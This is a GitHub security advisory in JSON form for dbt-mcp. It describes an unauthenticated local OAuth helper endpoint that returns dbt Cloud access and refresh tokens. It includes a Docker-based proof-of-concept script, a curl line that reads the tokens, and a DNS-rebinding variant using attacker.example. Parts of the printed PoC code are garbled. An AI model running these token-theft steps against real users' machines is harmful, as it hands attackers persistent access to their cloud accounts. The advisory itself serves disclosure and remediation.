@@ -1,0 +1,122 @@
+{
+  "id": "GHSA-jr33-mw75-7j8f",
+  "modified": "2026-06-19T21:30:08.776548500Z",
+  "published": "2026-06-19T21:15:40Z",
+  "aliases": [
+    "CVE-2026-55837"
+  ],
+  "summary": "dbt MCP Server: Unauthenticated OAuth Context Endpoint Leaks dbt Platform Tokens",
+  "details": "## Unauthenticated OAuth Context Endpoint Leaks dbt Platform Tokens\n\n### Summary\n\nThe local OAuth helper FastAPI server bundled with `dbt-mcp` exposes the `GET /dbt_platform_context` endpoint without any form of authentication or host-origin validation. After a user completes the OAuth login flow against dbt Cloud (cloud.getdbt.com), the endpoint returns the full `DbtPlatformContext` object — including the victim's `access_token` and `refresh_token` for the dbt Platform API — verbatim to any caller that can reach `127.0.0.1:6785`. An attacker who can direct the victim's browser to the helper origin via DNS rebinding, or who has co-located process access on the same host, can silently exfiltrate both tokens. The stolen bearer token grants full dbt Cloud API access as the victim; the refresh token enables persistent access beyond the original token's expiry. **CVSS Base Score: 8.0 (High).**\n\n### Details\n\nDuring the OAuth login flow, `dbt-mcp` launches an embedded FastAPI server (the \"OAuth helper\") bound to `127.0.0.1` starting on port `6785` (configured at `src/dbt_mcp/config/credentials.py:34`, `OAUTH_REDIRECT_STARTING_PORT = 6785`). After the OAuth callback is handled, the helper persists the full token context to disk and continues serving requests.\n\n**Data flow from source to sink:**\n\n1. **Source** — `src/dbt_mcp/oauth/fastapi_app.py:106`: The OAuth callback receives `token_response` from the dbt Platform authorization server.\n2. `src/dbt_mcp/oauth/dbt_platform.py:60`: `AccessTokenResponse(**token_response)` stores `access_token` and `refresh_token` as plaintext fields.\n3. `src/dbt_mcp/oauth/dbt_platform.py:64–69`: The `AccessTokenResponse` is embedded inside `DecodedAccessToken`, which is in turn embedded inside `DbtPlatformContext`.\n4. `src/dbt_mcp/oauth/fastapi_app.py:114`: The fully token-bearing `DbtPlatformContext` object is passed to `context_manager` for persistence.\n5. **Persistence sink** — `src/dbt_mcp/oauth/context_manager.py:63–64`: `yaml.dump(context.model_dump())` serializes the entire model — including tokens — to a YAML file on disk.\n6. **HTTP sink** — `src/dbt_mcp/oauth/fastapi_app.py:162–165`: The `GET /dbt_platform_context` route reads the YAML file back and returns the raw `DbtPlatformContext` object with no redaction.\n\n```python\n# src/dbt_mcp/oauth/fastapi_app.py:162-165\n@app.get(\"/dbt_platform_context\")\ndef get_dbt_platform_context() -\u003e DbtPlatformContext:\n    logger.info(\"Selected project received\")\n    return dbt_platform_context_manager.read_context() or DbtPlatformContext()\n```\n\n```python\n# src/dbt_mcp/oauth/dbt_platform.py:8-14\nclass AccessTokenResponse(BaseModel):\n    access_token: str\n    refresh_token: str\n    ...\n\nclass DbtPlatformContext(BaseModel):\n    decoded_access_token: DecodedAccessToken | None = None\n    ...\n```\n\n**Missing protections (confirmed by grep):**\n\n- No `TrustedHostMiddleware` — the server accepts requests with arbitrary `Host` headers, enabling DNS rebinding.\n- No `CORSMiddleware` — no cross-origin restrictions on which sites can read the response.\n- No CSRF protection, no session nonce, no `Origin` header validation.\n- The route has no FastAPI `Depends()` security dependency.\n\nA `grep -Rni \"TrustedHostMiddleware\\|CORSMiddleware\\|csrf\\|origin\"` across the OAuth FastAPI application returns no results.\n\n**Recommended remediation:**\n\n```diff\n--- a/src/dbt_mcp/oauth/fastapi_app.py\n+++ b/src/dbt_mcp/oauth/fastapi_app.py\n+from starlette.middleware.trustedhost import TrustedHostMiddleware\n+\n+def _redact_context(context: DbtPlatformContext | None) -\u003e DbtPlatformContext:\n+    if context is None:\n+        return DbtPlatformContext()\n+    return context.model_copy(update={\"decoded_access_token\": None})\n\n     app = FastAPI()\n+    app.add_middleware(\n+        TrustedHostMiddleware,\n+        allowed_hosts=[\"localhost\", \"127.0.0.1\"],\n+    )\n\n     @app.get(\"/dbt_platform_context\")\n     def get_dbt_platform_context() -\u003e DbtPlatformContext:\n         logger.info(\"Selected project received\")\n-        return dbt_platform_context_manager.read_context() or DbtPlatformContext()\n+        return _redact_context(dbt_platform_context_manager.read_context())\n```\n\n### PoC\n\n**Prerequisites:**\n\n- `dbt-mcp` v1.19.1 installed in a Python 3.12 environment.\n- The following runtime dependencies available: `authlib~=1.6.7`, `fastapi~=0.128.0`, `uvicorn~=0.38.0`, `pyyaml~=6.0.2`, `httpx~=0.28.1`, `starlette~=0.50.0`, `pydantic~=2.0`, `pydantic-settings~=2.10.1`.\n- No `DBT_TOKEN` set (OAuth flow mode active).\n\n**Step 1 — Build the Docker test environment:**\n\n```bash\ndocker build -t vuln001-dbt-mcp -f vuln-001/Dockerfile .\n```\n\nThe `Dockerfile` installs only the OAuth helper's runtime dependencies and copies `src/` and `poc.py`:\n\n```dockerfile\nFROM python:3.12-slim\nWORKDIR /app\nRUN pip install --no-cache-dir \\\n    \"authlib~=1.6.7\" \"fastapi~=0.128.0\" \"uvicorn~=0.38.0\" \\\n    \"pyjwt~=2.12.0\" \"pyyaml~=6.0.2\" \"httpx~=0.28.1\" \\\n    \"filelock~=3.20.3\" \"starlette~=0.50.0\" \"requests\u003e=2.28\" \\\n    \"pydantic~=2.0\" \"pydantic-settings~=2.10.1\"\nCOPY repo/src /app/src\nENV PYTHONPATH=/app/src\nCOPY vuln-001/poc.py /app/poc.py\nCMD [\"python3\", \"/app/poc.py\"]\n```\n\n**Step 2 — Run the PoC:**\n\n```bash\ndocker run --rm --network=host vuln001-dbt-mcp\n```\n\nThe PoC script (`poc.py`) performs the following automatically:\n\n1. Writes a realistic fake OAuth context YAML to `/tmp/dbt_poc_mcp.yml`, simulating a victim who has already completed the OAuth login flow.\n2. Instantiates the **real** `create_app()` from `src/dbt_mcp/oauth/fastapi_app.py` using `DbtPlatformContextManager` backed by the pre-seeded file.\n3. Starts the server on `127.0.0.1:16785` in a background thread.\n4. Issues an unauthenticated `GET /dbt_platform_context` with no `Authorization` header.\n5. Asserts that `access_token` and `refresh_token` are returned verbatim.\n\n**Equivalent manual curl (against the live OAuth helper during actual OAuth flow):**\n\n```bash\n# While the victim is running the OAuth login flow:\nexport DBT_HOST='cloud.getdbt.com'\nunset DBT_TOKEN\ndbt-mcp   # OAuth helper starts on 127.0.0.1:6785\n\n# From any co-located process (or a DNS-rebinding browser page):\ncurl -s 'http://127.0.0.1:6785/dbt_platform_context' \\\n  | jq '.decoded_access_token.access_token_response'\n```\n\n**Expected output (Phase 2 observed):**\n\n```\n[*] HTTP Status: 200\n[*] Full response JSON:\n{\n  \"decoded_access_token\": {\n    \"access_token_response\": {\n      \"access_token\": \"eyJhbGciOiJSUzI1NiJ9.VICTIM_ACCESS_TOKEN_PLACEHOLDER\",\n      \"refresh_token\": \"dbt-platform-offline-refresh-SUPERSECRET-abc123\",\n      \"expires_in\": 3600,\n      \"scope\": \"user_access offline_access\",\n      \"token_type\": \"Bearer\",\n      \"expires_at\": 9999999999\n    },\n    ...\n  },\n  ...\n}\n[!] LEAKED access_token  : eyJhbGciOiJSUzI1NiJ9.VICTIM_ACCESS_TOKEN_PLACEHOLDER\n[!] LEAKED refresh_token : dbt-platform-offline-refresh-SUPERSECRET-abc123\n[+] VULNERABILITY CONFIRMED: Tokens returned from /dbt_platform_context WITHOUT authentication!\n```\n\n**DNS rebinding variant:**\n\nA malicious website can resolve `attacker.example` to `127.0.0.1` after the browser's DNS TTL expires (\"DNS rebinding\"). Because the helper accepts any `Host` header, the browser treats `http://attacker.example:6785` as same-origin and fetches `/dbt_platform_context` via JavaScript `fetch()`, obtaining the full token JSON across the network without any local access.\n\n### Impact\n\nAny local process running as any user on the same host, or a remote attacker who exploits DNS rebinding against a victim's browser during or after the OAuth login session, can retrieve the victim's full dbt Cloud OAuth tokens with a single unauthenticated HTTP GET request. The `access_token` grants immediate bearer-token access to the dbt Cloud REST and GraphQL APIs on behalf of the victim. The `refresh_token` (with `offline_access` scope) allows the attacker to obtain new access tokens after the original expires, providing persistent unauthorized access until the victim manually revokes the OAuth grant. An attacker with these tokens can read or modify dbt projects, run jobs, access environment secrets, and exfiltrate data lineage and warehouse credentials stored in dbt Cloud.\n\nThis vulnerability is a **Missing Authentication for Critical Function** (CWE-306). Any developer machine running `dbt-mcp` with OAuth-mode authentication is affected for the duration of the OAuth helper process lifetime. Because `dbt-mcp` is a developer tool, the primary victims are individual developers and their associated dbt Cloud organization accounts.\n\n### Reproduction artifacts\n\n#### `Dockerfile`\n\n```dockerfile\nFROM python:3.12-slim\n\nWORKDIR /app\n\n# Install minimal runtime dependencies (no heavy dbt-protos/dbt-sl-sdk needed\n# because fastapi_app.py's import chain doesn't touch them)\nRUN pip install --no-cache-dir \\\n \"authlib~=1.6.7\" \\\n \"fastapi~=0.128.0\" \\\n \"uvicorn~=0.38.0\" \\\n \"pyjwt~=2.12.0\" \\\n \"pyyaml~=6.0.2\" \\\n \"httpx~=0.28.1\" \\\n \"filelock~=3.20.3\" \\\n \"starlette~=0.50.0\" \\\n \"requests\u003e=2.28\" \\\n \"pydantic~=2.0\" \\\n \"pydantic-settings~=2.10.1\"\n\n# Copy only the source tree needed for the OAuth server\nCOPY repo/src /app/src\n\nENV PYTHONPATH=/app/src\n\nCOPY vuln-001/poc.py /app/poc.py\n\nCMD [\"python3\", \"/app/poc.py\"]\n```\n\n#### `poc.py`\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nPoC for VULN-001: Unauthenticated OAuth Con Endpoint Leaks dbt Platform Tokens\n\nAttack scenario:\n - dbt-mcp runs a local FastAPI OAuth helper on 127.0.0.1:6785 during login.\n - After the OAuth flow completes, tokens are persisted to ~/.dbt/mcp.yml.\n - GET /dbt_platform_con is accessible with NO authentication at all.\n - Any process on the same host (or a DNS-rebinding browser page) can call it\n and receive the full access_token + refresh_token.\n\nThis PoC:\n 1. Pre-seeds a con file with fake-but-realistic OAuth tokens\n (simulating a victim who has already completed the OAuth flow).\n 2. Starts the real vulnerable FastAPI app from src/dbt_mcp/oauth/fastapi_app.py.\n 3. Issues an unauthenticated HTTP GET /dbt_platform_con (no auth header).\n 4. Confirms the tokens are returned verbatim.\n\"\"\"\n\nimport asyncio\nimport json\nimport os\nimport sys\nimport tempfile\nimport threading\nimport time\nfrom pathlib import Path\n\nimport httpx\nimport uvicorn\nimport yaml\n\n# Fake tokens that simulate a victim's completed OAuth session.\nFAKE_ACCESS_TOKEN = \"eyJhbGciOiJSUzI1NiJ9.VICTIM_ACCESS_TOKEN_PLACEHOLDER\"\nFAKE_REFRESH_TOKEN = \"dbt-platform-offline-refresh-SUPERSECRET-abc123\"\n\nFAKE_CONTEXT = {\n \"decoded_access_token\": {\n \"access_token_response\": {\n \"access_token\": FAKE_ACCESS_TOKEN,\n \"refresh_token\": FAKE_REFRESH_TOKEN,\n \"expires_in\": 3600,\n \"scope\": \"user_access offline_access\",\n \"token_type\": \"Bearer\",\n \"expires_at\": 9999999999,\n },\n \"decoded_claims\": {\n \"sub\": \"99999\",\n \"iat\": 1700000000,\n \"exp\": 9999999999,\n },\n },\n \"host_prefix\": \"victimco\",\n \"dbt_host\": \"cloud.getdbt.com\",\n \"account_id\": 42,\n \"selected_project_ids\": None,\n \"dev_environment\": None,\n \"prod_environment\": None,\n}\n\nPORT = 16785\n\n\ndef start_server(context_file: Path, static_dir: str) -\u003e None:\n \"\"\"Run the actual vulnerable FastAPI app in a background thread.\"\"\"\n from authlib.integrations.requests_client import OAuth2Session\n from dbt_mcp.oauth.context_manager import DbtPlatformContextManager\n from dbt_mcp.oauth.fastapi_app import create_app\n\n context_manager = DbtPlatformContextManager(context_file)\n\n # A dummy OAuth client — only used by the /oauth-callback route,\n # which this PoC never triggers.\n fake_oauth_client = OAuth2Session(client_id=\"poc-dummy-client\")\n\n app = create_app(\n oauth_client=fake_oauth_client,\n state_to_verifier={},\n dbt_platform_url=\"https://cloud.getdbt.com\",\n static_dir=static_dir,\n dbt_platform_context_manager=context_manager,\n )\n\n loop = asyncio.new_event_loop()\n asyncio.set_event_loop(loop)\n config = uvicorn.Config(\n app=app, host=\"127.0.0.1\", port=PORT, log_level=\"error\", loop=\"asyncio\"\n )\n server = uvicorn.Server(config)\n loop.run_until_complete(server.serve())\n\n\ndef wait_for_server(port: int, timeout: float = 15.0) -\u003e bool:\n import socket\n\n deadline = time.time() + timeout\n while time.time() \u003c deadline:\n try:\n with socket.create_connection((\"127.0.0.1\", port), timeout=1):\n return True\n except OSError:\n time.sleep(0.2)\n return False\n\n\ndef main() -\u003e int:\n print(\"[*] VULN-001 PoC — Unauthenticated /dbt_platform_con token leak\")\n print(\"=\" * 70)\n\n # 1. Pre-seed con file (victim has completed OAuth; tokens are on disk)\n context_file = Path(\"/tmp/dbt_poc_mcp.yml\")\n context_file.write_(\n yaml.dump(FAKE_CONTEXT, default_flow_style=False), encoding=\"utf-8\"\n )\n print(f\"[*] Con file written: {context_file}\")\n print(f\" access_token : {FAKE_ACCESS_TOKEN}\")\n print(f\" refresh_token : {FAKE_REFRESH_TOKEN}\")\n\n # 2. Minimal static dir so NoCacheStaticFiles mount doesn't error on startup\n static_dir = tempfile.mkdtemp(prefix=\"dbt_poc_static_\")\n (Path(static_dir) / \"index.html\").write_(\"\u003chtml\u003edbt OAuth\u003c/html\u003e\")\n\n # 3. Start the real vulnerable FastAPI server in a background thread\n t = threading.Thread(\n target=start_server, args=(context_file, static_dir), daemon=True\n )\n t.start()\n\n print(f\"\\n[*] Waiting for FastAPI server to start on 127.0.0.1:{PORT} ...\")\n if not wait_for_server(PORT):\n print(\"[-] FAIL: Server did not start within timeout.\")\n return 2\n\n print(\"[*] Server is up.\")\n\n # 4. Send unauthenticated GET /dbt_platform_con (no Authorization header)\n url = f\"http://127.0.0.1:{PORT}/dbt_platform_con\"\n print(f\"\\n[*] Sending unauthenticated GET {url}\")\n try:\n resp = httpx.get(url, timeout=10)\n except Exception as exc:\n print(f\"[-] HTTP request failed: {exc}\")\n return 2\n\n print(f\"[*] HTTP Status: {resp.status_code}\")\n\n if resp.status_code != 200:\n print(f\"[-] FAIL: Expected 200, got {resp.status_code}\")\n print(f\" Body: {resp.[:500]}\")\n return 1\n\n try:\n data = resp.json()\n except Exception as exc:\n print(f\"[-] FAIL: Response is not JSON: {exc}\\n Body: {resp.[:500]}\")\n return 1\n\n print(f\"\\n[*] Full response JSON:\\n{json.dumps(data, indent=2)}\")\n\n # 5. Verify that the tokens are in the response (no redaction, no auth required)\n try:\n leaked_access = (\n data[\"decoded_access_token\"][\"access_token_response\"][\"access_token\"]\n )\n leaked_refresh = (\n data[\"decoded_access_token\"][\"access_token_response\"][\"refresh_token\"]\n )\n except (KeyError, TypeError) as exc:\n print(f\"\\n[-] FAIL: Token fields missing from response: {exc}\")\n return 1\n\n print(f\"\\n[!] LEAKED access_token : {leaked_access}\")\n print(f\"[!] LEAKED refresh_token : {leaked_refresh}\")\n\n if leaked_access == FAKE_ACCESS_TOKEN and leaked_refresh == FAKE_REFRESH_TOKEN:\n print(\n \"\\n[+] VULNERABILITY CONFIRMED:\"\n \" Tokens returned from /dbt_platform_con WITHOUT authentication!\"\n )\n return 0\n else:\n print(\"\\n[-] FAIL: Returned tokens do not match expected values.\")\n print(f\" Expected access_token : {FAKE_ACCESS_TOKEN}\")\n print(f\" Got access_token : {leaked_access}\")\n return 1\n\n\nif __name__ == \"__main__\":\n sys.exit(main())\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "dbt-mcp",
+        "purl": "pkg:pypi/dbt-mcp"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.20.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.0.1a1",
+        "0.1.0",
+        "0.1.1",
+        "0.1.2",
+        "0.1.2rc1",
+        "0.1.2rc2",
+        "0.1.3",
+        "0.10.0",
+        "0.10.1",
+        "0.10.2",
+        "0.10.3",
+        "0.2.1",
+        "0.2.10",
+        "0.2.11",
+        "0.2.12",
+        "0.2.13",
+        "0.2.14",
+        "0.2.15",
+        "0.2.16",
+        "0.2.17",
+        "0.2.18",
+        "0.2.19",
+        "0.2.20",
+        "0.2.3",
+        "0.2.4",
+        "0.2.5",
+        "0.2.6",
+        "0.2.7",
+        "0.2.8",
+        "0.2.9",
+        "0.3.0",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.5.0",
+        "0.6.0",
+        "0.6.1",
+        "0.7.0",
+        "0.8.0",
+        "0.8.1",
+        "0.8.2",
+        "0.8.3",
+        "0.8.4",
+        "0.9.0",
+        "0.9.1",
+        "1.0.0",
+        "1.1.0",
+        "1.10.0",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.14.0",
+        "1.15.0",
+        "1.17.0",
+        "1.17.1",
+        "1.18.0",
+        "1.18.1",
+        "1.19.0",
+        "1.19.1",
+        "1.19.2",
+        "1.2.0",
+        "1.3.0",
+        "1.4.0",
+        "1.5.0",
+        "1.5.1",
+        "1.5.2",
+        "1.6.0",
+        "1.6.2",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0",
+        "1.9.1",
+        "1.9.2",
+        "1.9.3"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-jr33-mw75-7j8f/GHSA-jr33-mw75-7j8f.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/dbt-labs/dbt-mcp/security/advisories/GHSA-jr33-mw75-7j8f"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/dbt-labs/dbt-mcp"
+    }
+  ]
+}
